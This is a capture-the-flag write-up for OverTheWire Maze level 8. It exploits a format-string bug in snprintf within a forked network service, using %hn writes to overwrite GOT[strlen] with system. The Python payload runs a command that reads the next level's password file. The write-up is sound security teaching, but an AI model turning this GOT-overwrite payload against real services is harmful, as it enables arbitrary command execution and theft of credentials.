# OverTheWire — Maze Level 8 → 9 (FINAL)

> Goal: Get `maze9` password from `maze8`. Result: **`**********`** (hidden)
> Technique: **Format string vulnerability** (`snprintf(out, n, user_input)`) → `%n` arbitrary
> write → overwrite `GOT[strlen]` with `system` (No RELRO) → `system(outbuf)` leaks the password.

---

## 1. First Look
```bash
/maze/maze8           # bind(): ... (a NETWORK SERVICE; default port 1337)
checksec: No canary | NX DISABLED | No PIE | No RELRO
```
TCP service: `socket/bind/listen/accept`, **`fork`** per connection.

## 2. Analysis (child process)
```c
setreuid(geteuid(), geteuid());          // ruid=euid=maze9 (all subsequent steps are maze9)
send(conn, "Give the correct password to proceed: ", ...);
n = recv(conn, recvbuf, 0x1ff, 0);  recvbuf[n] = 0;
if (strcmp(recvbuf, "god") == 0) { ...joke... }
else {
    snprintf(outbuf, 0x200, recvbuf);    // <-- FORMAT STRING = user input!
    // outbuf += " is wrong g ^_^"
    strlen(outbuf);  ...  send(conn, outbuf, ...);  _exit(0);
}
```

## 3. Vulnerability
`snprintf(outbuf, 0x200, recvbuf)` — the second argument is not a fixed format string but the
**data sent by the user**. Classic **format string** vulnerability: `%p` leaks memory,
**`%n` performs arbitrary writes**. `No RELRO` → GOT is writable.

`%p` probing revealed **format offset = 1** (our input's first dword is `%1$`).
`system = 0xf7dd18e0` (gdb, ASLR off), `GOT[strlen] = 0x804b268`.

## 4. Plan — `GOT[strlen]` → `system`
`strlen(outbuf)` is called **immediately after** `snprintf`. If we replace `GOT[strlen]` with
`system`, that call becomes **`system(outbuf)`**. Starting `outbuf` with
`"cat /etc/maze_pass/maze9;#…"` executes the command; the rest is treated as a `#` comment.

Two `%hn` writes (snprintf's `%n` uses the **untruncated** character count):
```
low half  0x18e0 -> 0x804b268
high half 0xf7dd -> 0x804b26a
```

## 5. Exploit (payload)
```python
prefix = b"cat /etc/maze_pass/maze9;#".ljust(28,b'#')   # 28 = dword-aligned
a1=p32(0x804b268); a2=p32(0x804b26a)                    # GOT[strlen], +2
printed=28+8
fmt = b"%%%dc%%8$hn%%%dc%%9$hn" % (0x18e0-printed, 0xf7dd-0x18e0)
payload = prefix + a1 + a2 + fmt
# address dwords at %8$ (=offset 28) and %9$ (=offset 32)
```
- `prefix(28)+a1+a2 = 36` characters printed → `%<0x18e0-36>c%8$hn` → writes `0x18e0` @ GOT[strlen].
- `%<0xf7dd-0x18e0>c%9$hn` → writes `0xf7dd` @ GOT[strlen]+2 → `GOT[strlen]=0xf7dd18e0=system`.
- Next `strlen(outbuf)` → `system("cat /etc/maze_pass/maze9;#…")` → since the child is maze9,
  the password is printed to `fd1`.

```
=== maze9 password === 
**********
=== /maze9 CONGRATULATIONS ===
Well done! It sure looks like you enjoy swimming in memory.
```

## Lessons
| Topic | Note |
|-------|------|
| Format string | `printf(user)`/`snprintf(buf,n,user)` — user input as format enables `%n`/`%p` exploitation |
| `%n` arbitrary write | Writes the number of characters printed so far to the given address; `%hn`/`%hhn` for half-word writes |
| `snprintf` + `%n` | Even if truncated to 0x200, `%n` counts the **full** (would-be) length |
| GOT overwrite | No RELRO → `GOT[strlen]=system`; next `strlen(x)` → `system(x)` |
| `system(outbuf)` | Start outbuf with command + `#` to comment out the rest |
| Fork+setuid service | Vulnerability triggers in the child after `setreuid` → code runs as the target user |
